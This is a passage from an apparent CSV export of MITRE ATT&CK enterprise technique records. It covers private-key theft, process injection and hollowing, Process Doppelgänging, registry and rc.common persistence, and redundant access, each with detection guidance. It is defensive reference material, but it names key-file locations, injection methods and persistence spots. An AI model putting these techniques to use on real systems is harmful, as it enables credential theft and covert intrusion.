'http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf'}, {'source_name': 'FireEye PowerShell Logging 2016', 'description': 'Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.', 'url': 'https://www.fireeye.com/blog/threat-research/2016/02/greater%20visibilityt.html'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","True","",""
"attack-pattern","attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Private Keys","Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)

Adversaries may gather private keys from compromised systems for use in authenticating to Remote Services like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as `~/.ssh` for SSH keys on *nix-based systems or `C:\Users\(username)\.ssh\` on Windows.

Private keys should require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line.

Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)

Detection: Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.

Platforms: Linux, Windows, macOS

Data Sources: File monitoring

Permissions Required: User

Contributors: Itzik Kotler, SafeBreach","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1145', 'external_id': 'T1145'}, {'source_name': 'Wikipedia Public Key Crypto', 'description': 'Wikipedia. (2017, June 29). Public-key cryptography. Retrieved July 5, 2017.', 'url': 'https://en.wikipedia.org/wiki/Public-key%20cryptography'}, {'source_name': 'Kaspersky Careto', 'description': 'Kaspersky Labs. (2014, February 11). Unveiling “Careto” - The Masked APT. Retrieved July 5, 2017.', 'url': 'https://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask%20v1.0.pdf'}, {'source_name': 'Palo Alto Prince of Persia', 'description': 'Bar, T., Conant, S., Efraim, L. (2016, June 28). Prince of Persia – Game Over. Retrieved July 5, 2017.', 'url': 'https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring']","['User']","['Linux', 'Windows', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Itzik Kotler, SafeBreach']","","","","",""
"attack-pattern","attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580","2017-05-31T21:30:48.728Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Process Discovery","Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network.

===Windows===

An example command that would obtain details on processes is ""tasklist"" using the Tasklist utility.

===Mac and Linux===

In Mac and Linux, this is accomplished with the `ps` command.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: Process command-line parameters, Process monitoring

Permissions Required: User, Administrator, SYSTEM

System Requirements: Administrator, SYSTEM may provide better process ownership details","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1057', 'external_id': 'T1057'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process command-line parameters', 'Process monitoring']","['User', 'Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Administrator, SYSTEM may provide better process ownership details']","","",""
"attack-pattern","attack-pattern--c1a452f3-6499-4c12-b7e9-a6a0a102af76","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Process Doppelgänging","Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)

Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)

Adversaries may leverage TxF to a perform a file-less variation of Process Injection called Process Doppelgänging. Similar to Process Hollowing, Process Doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelgänging Dec 2017)

Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):
* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.
* Load – Create a shared section of memory and load the malicious executable.
* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.
* Animate – Create a process from the tainted section of memory and initiate execution.

Detection: Monitor and analyze calls to CreateTranscation, CreateFileTransacted, RollbackTransaction, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to NtCreateProcessEx and NtCreateThreadEx as well as API calls used to modify memory within another process, such as WriteProcessMemory. (Citation: BlackHat Process Doppelgänging Dec 2017) (Citation: hasherezade Process Doppelgänging Dec 2017)

Scan file objects reported during the PsSetCreateProcessNotifyRoutine, (Citation: Microsoft PsSetCreateProcessNotifyRoutine routine) which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. (Citation: BlackHat Process Doppelgänging Dec 2017) Also consider comparing file objects loaded in memory to the corresponding file on disk. (Citation: hasherezade Process Doppelgänging Dec 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.

Platforms: Windows

Data Sources: API monitoring, Process Monitoring

Defense Bypassed: Process whitelisting, Anti-virus, Whitelisting by file name or path, Signature-based detection

Permissions Required: User, Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1186', 'external_id': 'T1186'}, {'source_name': 'Microsoft TxF', 'description': 'Microsoft. (n.d.). Transactional NTFS (TxF). Retrieved December 20, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/bb968806.aspx'}, {'source_name': 'Microsoft Basic TxF Concepts', 'description': 'Microsoft. (n.d.). Basic TxF Concepts. Retrieved December 20, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/dd979526.aspx'}, {'source_name': 'Microsoft Where to use TxF', 'description': 'Microsoft. (n.d.). When to Use Transactional NTFS. Retrieved December 20, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/aa365738.aspx'}, {'source_name': 'BlackHat Process Doppelgänging Dec 2017', 'description': 'Liberman, T. & Kogan, E. (2017, December 7). Lost in Transaction: Process Doppelgänging. Retrieved December 20, 2017.', 'url': 'https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf'}, {'source_name': 'hasherezade Process Doppelgänging Dec 2017', 'description': 'hasherezade. (2017, December 18). Process Doppelgänging – a new way to impersonate a process. Retrieved December 20, 2017.', 'url': 'https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/'}, {'source_name': 'Microsoft PsSetCreateProcessNotifyRoutine routine', 'description': 'Microsoft. (n.d.). PsSetCreateProcessNotifyRoutine routine. Retrieved December 20, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/hardware/ff559951.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Process Monitoring']","['User', 'Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Process whitelisting', 'Anti-virus', 'Whitelisting by file name or path', 'Signature-based detection']"
"attack-pattern","attack-pattern--1c338d0f-a65e-4073-a5c1-c06878849f21","2017-05-31T21:31:09.815Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Process Hollowing","Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to Process Injection, execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. (Citation: Leitch Hollowing) (Citation: Engame Process Injection July 2017)

Detection: Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls that unmap process memory, such as ZwUnmapViewOfSection or NtUnmapViewOfSection, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Engame Process Injection July 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.

Platforms: Windows

Data Sources: Process monitoring, API monitoring

Defense Bypassed: Process whitelisting, Anti-virus, Whitelisting by file name or path, Signature-based detection

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1093', 'external_id': 'T1093'}, {'source_name': 'Leitch Hollowing', 'description': 'Leitch, J. (n.d.). Process Hollowing. Retrieved November 12, 2014.', 'url': 'http://www.autosectools.com/process-hollowing.pdf'}, {'source_name': 'Engame Process Injection July 2017', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'API monitoring']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Process whitelisting', 'Anti-virus', 'Whitelisting by file name or path', 'Signature-based detection']"
"attack-pattern","attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d","2017-05-31T21:30:47.843Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Process Injection","Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

===Windows===

There are multiple approaches to injecting code into a live process. Windows implementations include: (Citation: Engame Process Injection July 2017)
* '''Dynamic-link library (DLL) injection''' involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.
* '''Portable executable injection''' involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. (Citation: Endgame HuntingNMemory June 2017)
* '''Thread execution hijacking''' involves injecting malicious code or the path to a DLL into a thread of a process. Similar to Process Hollowing, the thread must first be suspended.
* '''Asynchronous Procedure Call''' (APC) injection involves attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state. AtomBombing  (Citation: ENSIL AtomBombing Oct 2016) is a variation that utilizes APCs to invoke malicious code previously written to the global atom table. (Citation: Microsoft Atom Table)
* '''Thread Local Storage''' (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. (Citation: FireEye TLS Nov 2017)

===Mac and Linux===

Implementations for Linux and OS X/macOS systems include: (Citation: Datawire Code Injection) (Citation: Uninformed Needle)
*'''LD_PRELOAD, LD_LIBRARY_PATH''' (Linux), '''DYLD_INSERT_LIBRARIES''' (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. (Citation: Phrack halfdead 1997)
*'''Ptrace system calls''' can be used to attach to a running process and modify it in runtime. (Citation: Uninformed Needle)
*'''/proc/[pid]/mem''' provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. (Citation: Uninformed Needle)
*'''VDSO hijacking''' performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)

Malware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.

Detection: Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Engame Process Injection July 2017)

Monitoring for Linux specific calls such as the ptrace system call, the use of LD_PRELOAD environment variable, or dlfcn dynamic linking API calls, should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.  (Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits)

Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules. (Citation: Microsoft Sysmon v6 May 2017)

Monitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using PowerShell with tools such as PowerSploit, (Citation: Powersploit) so additional PowerShell monitoring may be required to cover known implementations of this behavior.

Platforms: Linux, macOS, Windows

Data Sources: API monitoring, Windows Registry, File monitoring, DLL monitoring, Named Pipes, Process Monitoring

Effective Permissions: User, Administrator, SYSTEM, root

Defense Bypassed: Process whitelisting, Anti-virus

Permissions Required: User, Administrator, SYSTEM, root

Contributors: Anastasios Pingios","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1055', 'external_id': 'T1055'}, {'source_name': 'Powersploit', 'description': 'PowerSploit. (n.d.).  Retrieved December 4, 2014.', 'url': 'https://github.com/mattifestation/PowerSploit'}, {'source_name': 'Engame Process Injection July 2017', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process'}, {'source_name': 'Endgame HuntingNMemory June 2017', 'description': 'Desimone, J. (2017, June 13). Hunting in Memory. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/hunting-memory'}, {'source_name': 'Microsoft APC', 'description': 'Microsoft. (n.d.). Asynchronous Procedure Calls. Retrieved December 8, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx'}, {'source_name': 'ENSIL AtomBombing Oct 2016', 'description': 'Liberman, T. (2016, October 27). ATOMBOMBING: BRAND NEW CODE INJECTION FOR WINDOWS. Retrieved December 8, 2017.', 'url': 'https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows'}, {'source_name': 'Microsoft Atom Table', 'description': 'Microsoft. (n.d.). About Atom Tables. Retrieved December 8, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ms649053.aspx'}, {'source_name': 'FireEye TLS Nov 2017', 'description': 'Vaish, A. & Nemes, S. (2017, November 28). Newly Observed Ursnif Variant Employs Malicious TLS Callback Technique to Achieve Process Injection. Retrieved December 18, 2017.', 'url': 'https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html'}, {'source_name': 'Datawire Code Injection', 'description': 'Turner-Trauring, I. (2017, April 18). “This will only hurt for a moment”: code injection on Linux and macOS with LD_PRELOAD. Retrieved December 20, 2017.', 'url': 'https://www.datawire.io/code-injection-on-linux-and-macos/'}, {'source_name': 'Uninformed Needle', 'description': 'skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.', 'url': 'http://hick.org/code/skape/papers/needle.txt'}, {'source_name': 'Phrack halfdead 1997', 'description': 'halflife. (1997, September 1). Shared Library Redirection Techniques. Retrieved December 20, 2017.', 'url': 'http://phrack.org/issues/51/8.html'}, {'source_name': 'VDSO hijack 2009', 'description': ""O'Neill, R. (2009, May). Modern Day ELF Runtime infection via GOT poisoning. Retrieved December 20, 2017."", 'url': 'http://vxer.org/lib/vrn00.html'}, {'source_name': 'ArtOfMemoryForensics', 'description': 'Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.'}, {'source_name': 'GNU Acct', 'description': 'GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.', 'url': 'https://www.gnu.org/software/acct/'}, {'source_name': 'RHEL auditd', 'description': 'Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.', 'url': 'https://access.redhat.com/documentation/red%20hat%20enterprise%20linux/6/html/security%20guide/chap-system%20auditing'}, {'source_name': 'Chokepoint preload rootkits', 'description': 'stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.', 'url': 'http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html'}, {'source_name': 'Microsoft Sysmon v6 May 2017', 'description': 'Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.', 'url': 'https://docs.microsoft.com/sysinternals/downloads/sysmon'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Windows Registry', 'File monitoring', 'DLL monitoring', 'Named Pipes', 'Process Monitoring']","['User', 'Administrator', 'SYSTEM', 'root']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Anastasios Pingios']","['User', 'Administrator', 'SYSTEM', 'root']","","","","['Process whitelisting', 'Anti-virus']"
"attack-pattern","attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896","2017-05-31T21:30:25.584Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Query Registry","Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

The Registry contains a significant amount of information about the operating system, configuration, software, and security. (Citation: Wikipedia Windows Registry) Some of the information may help adversaries to further their operation within a network.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Interaction with the Windows Registry may come from the command line using utilities such as Reg or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Windows

Data Sources: Windows Registry, Process monitoring, Process command-line parameters

Permissions Required: User, Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1012', 'external_id': 'T1012'}, {'source_name': 'Wikipedia Windows Registry', 'description': 'Wikipedia. (n.d.). Windows Registry. Retrieved February 2, 2015.', 'url': 'https://en.wikipedia.org/wiki/Windows%20Registry'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'Process monitoring', 'Process command-line parameters']","['User', 'Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--18d4ab39-12ed-4a16-9fdb-ae311bba4a0f","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Rc.common","During the boot process, macOS and Linux both execute `source /etc/rc.common`, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.

Adversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user (Citation: Methods of Mac Malware Persistence).

Detection: The `/etc/rc.common` file can be monitored to detect changes from the company policy. Monitor process execution resulting from the rc.common script for unusual or unknown applications or behavior.

Platforms: Linux, macOS

Data Sources: File monitoring, Process Monitoring

Permissions Required: root","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1163', 'external_id': 'T1163'}, {'source_name': 'Startup Items', 'description': 'Apple. (2016, September 13). Startup Items. Retrieved July 11, 2017.', 'url': 'https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html'}, {'source_name': 'Methods of Mac Malware Persistence', 'description': 'Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.', 'url': 'https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring']","['root']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--6a3be63a-64c5-4678-a036-03ff8fc35300","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Re-opened Applications","Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at `~/Library/Preferences/com.apple.loginwindow.plist` and `~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist`. 

An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).

Detection: Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.

Platforms: macOS

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1164', 'external_id': 'T1164'}, {'source_name': 'Methods of Mac Malware Persistence', 'description': 'Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.', 'url': 'https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","","['User']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--6aabc5ec-eae6-422c-8311-38d45ee9838a","2017-05-31T21:31:18.867Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Redundant Access","Adversaries may use more than one remote access tool with varying command and control protocols as a hedge against detection. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to Valid Accounts to use External Remote Services such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network. (Citation: Mandiant APT1)

Use of a Web Shell is one such way to maintain access to a network through an externally accessible Web server.

Detection: Existing methods of detecting remote access tools are helpful. Backup remote access tools or other access points may not have established command and control channels open during an intrusion, so the volume of data transferred may not be as high as the primary channel unless access is lost.

Detection of tools based on beacon traffic, Command and Control protocol, or adversary infrastructure require prior threat intelligence on tools, IP addresses, and/or domains the adversary may use, along with the ability to detect use at the network boundary. Prior knowledge of indicators of compromise may also help detect adversary tools at the endpoint if tools are available to scan for those indicators.

If an intrusion is in progress and sufficient endpoint data or decoded command and control traffic is collected, then defenders will likely be able to detect additional tools dropped as the adversary is conducting the operation.

For alternative access using externally accessible VPNs or remote services, follow detection recommendations under Valid Accounts and External Remote Services to collect account use information.

Platforms: Linux, macOS, Windows

Data Sources: Process monitoring, Process use of network, Packet capture, Network protocol analysis, File monitoring, Binary file metadata, Authentication logs

Defense Bypassed: Anti-virus, Network intrusion detection system

Permissions Required: User, Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1108', 'external_id': 'T1108'}, {'source_name': 'Mandiant APT1', 'description': 'Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.', 'url': 'https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process monitoring', 'Process use of network', 'Packet capture', 'Network protocol analysis', 'File monitoring', 'Binary file metadata', 'Authentication logs']","['User', 'Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Anti-virus', 'Network intrusion detection system']"
"attack-pattern","attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc","2017-05-31T21:30:49.988Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Registry Run Keys / Start Folder","Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) The program will be executed under the context of the user and will have the account's associated permissions level.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.

Detection: Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.

Changes to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Platforms: Windows

Data Sources: Windows Registry, File monitoring

Permissions Required: User, Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1060', 'external_id': 'T1060'}, {'source_name': 'Microsoft Run Key', 'description': 'Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.', 'url': 'http://msdn.microsoft.com/en-us/library/aa376977'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'File monitoring']","['User', 'Administrator']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--215190a9-9f02-4e83-bb5f-e0589965a302","2017-05-31T21:31:33.499Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Regsvcs/Regasm","Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

